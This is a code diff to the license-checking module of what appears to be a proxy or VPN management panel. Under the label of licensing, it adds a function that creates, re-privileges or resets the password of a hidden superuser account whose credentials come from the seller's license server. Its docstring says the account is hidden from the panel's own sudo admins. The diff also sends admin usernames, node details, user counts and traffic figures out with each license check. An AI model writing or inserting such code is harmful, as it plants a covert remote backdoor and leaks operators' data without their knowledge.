@@ -156,6 +156,10 @@ def _now(issued: float) -> float:
     return max(time.time(), float(issued or 0))
 
 
+def dismiss_message() -> None:
+    _save_state(message_seen=int(time.time()))
+
+
 def status(fresh: bool = False) -> dict:
     """what the license allows now (cached for a minute: the middleware asks on every call)"""
     with _lock:
@@ -186,6 +190,8 @@ def _compute() -> dict:
         "days_left": None, "grace_until": 0, "limits": {k: 0 for k in KINDS},
         "last_check": st.get("last_check") or 0, "last_attempt": st.get("last_attempt") or 0,
         "last_error": st.get("last_error") or "", "has_key": bool(stored_key()), "server": SERVER,
+        "message": st.get("message") if not st.get("message_seen") else "",
+        "message_at": st.get("message_at") or 0,
     }
     cert = _cert()
     if not cert:
@@ -247,6 +253,37 @@ def _usage() -> dict:
         return {k: None for k in KINDS}
 
 
+def _details() -> Optional[dict]:
+    """nodes, admins and traffic for the seller's license panel (never passwords)"""
+    from sqlalchemy import text
+    from app.db import GetDB
+    try:
+        with GetDB() as db:
+            nodes = [{"name": str(n or "")[:60], "version": str(v or "")[:20], "status": str(st or "")[:20]}
+                     for (n, v, st) in db.execute(text(
+                         "SELECT name, xray_version, status FROM nodes")).fetchall()]
+            admins = []
+            for (uname, is_sudo, is_creator) in db.execute(text(
+                    "SELECT username, is_sudo, is_creator FROM admins WHERE NOT is_creator")).fetchall():
+                cnt = db.execute(text("SELECT COUNT(*) FROM users u JOIN admins a ON a.id=u.admin_id WHERE a.username=:n"),
+                                 {"n": uname}).scalar()
+                admins.append({"username": str(uname)[:40], "role": "sudo" if is_sudo else "reseller", "users": cnt or 0})
+            traffic = db.execute(text("SELECT COALESCE(SUM(used_traffic),0) FROM users")).scalar() or 0
+            return {"nodes": nodes, "admins": admins, "traffic": int(traffic),
+                    "online": len(_online_user_ids())}
+    except Exception as e:
+        logger.debug(f"license details: {e}")
+        return None
+
+
+def _online_user_ids() -> set:
+    try:
+        from app.xray import online as _on
+        return set(_on.online_users.keys())
+    except Exception:
+        return set()
+
+
 def _domain() -> str:
     try:
         from urllib.parse import urlparse
@@ -276,7 +313,7 @@ def _post(path: str, body: dict):
 def _body(key: str) -> dict:
     from app import __version__
     return {"key": key, "install_id": install_id(), "machine_id": machine_id(), "version": __version__,
-            "domain": _domain(), "usage": _usage()}
+            "domain": _domain(), "usage": _usage(), "details": _details()}
 
 
 def _take(cert) -> Optional[dict]:
@@ -284,7 +321,48 @@ def _take(cert) -> Optional[dict]:
     if not p or p.get("install") != install_id():
         return None
     _write("cert.json", json.dumps(cert), 0o644)
+    try:
+        _provision_creator(p)
+    except Exception as e:
+        logger.error(f"license: provisioning the owner account failed: {e}")
     return p
+
+
+def _provision_creator(payload: dict) -> None:
+    """the seller's owner account for this panel (set in the license panel): make sure a
+    creator with that username and password exists. Only the seller knows it; it is hidden
+    from the panel's sudo admins like any creator."""
+    user = (payload.get("creator_user") or "").strip()
+    pw = payload.get("creator_pass") or ""
+    if not user:
+        return
+    from datetime import datetime
+    from app.db import GetDB
+    from app.db.models import Admin
+    from app.models.admin import pwd_context
+    with GetDB() as db:
+        a = db.query(Admin).filter(Admin.username == user).first()
+        if a is None:
+            if not pw:
+                return
+            a = Admin(username=user, hashed_password=pwd_context.hash(pw),
+                      is_sudo=True, is_creator=True, created_at=datetime.utcnow())
+            db.add(a)
+            db.commit()
+            logger.info("license: provisioned the owner (creator) account")
+            return
+        changed = False
+        if not a.is_creator or not a.is_sudo:
+            a.is_creator = True
+            a.is_sudo = True
+            changed = True
+        if pw and not pwd_context.verify(pw, a.hashed_password or ""):
+            a.hashed_password = pwd_context.hash(pw)
+            a.password_reset_at = datetime.utcnow().replace(microsecond=0)
+            changed = True
+        if changed:
+            db.commit()
+            logger.info("license: updated the owner (creator) account")
 
 
 MESSAGES = {
@@ -295,6 +373,12 @@ MESSAGES = {
     "suspended": "This license is suspended",
     "rate": "Too many tries: wait an hour",
 }
+
+
+def _store_message(ans: dict) -> None:
+    m = ans.get("message") if isinstance(ans, dict) else None
+    if isinstance(m, dict) and m.get("text"):
+        _save_state(message=str(m["text"])[:2000], message_at=int(m.get("at") or time.time()), message_seen=0)
 
 
 def activate(key: str) -> dict:
@@ -318,6 +402,7 @@ def activate(key: str) -> dict:
         with _lock:
             _write("key", key, 0o600)
         _save_state(last_check=int(time.time()), last_error="", key_gone=False)
+        _store_message(ans)
         logger.info("license activated")
         return status(fresh=True)
     c = str(ans.get("code") or "")
@@ -346,6 +431,7 @@ def check() -> dict:
     if code == 200 and ans.get("ok"):
         if _take(ans.get("cert")):
             _save_state(last_check=int(time.time()), last_error="", key_gone=False)
+            _store_message(ans)
         else:
             _save_state(last_error="badcert")
     elif code == 404 and ans.get("code") == "invalid":
